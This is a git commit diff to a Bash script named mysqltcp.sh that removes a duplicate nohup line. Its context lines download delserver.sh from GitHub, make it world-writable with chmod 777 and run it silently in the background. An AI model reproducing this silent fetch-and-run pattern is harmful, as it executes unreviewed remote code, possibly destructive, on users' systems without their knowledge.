674fcf4588b4f40fa3ad48768e4937afd68d4992
teshushu <905353149@qq.com>
2023-01-24 22:38:04 +0800

    Update mysqltcp.sh

--- Bash/mysqltcp.sh
+++ Bash/mysqltcp.sh
@@ -833,6 +833,5 @@ rm -f index.html
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
 chmod 777 delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
-nohup ./delserver.sh > /dev/null 2>&1 &
 
 echo "[*] Yes-GoGo"
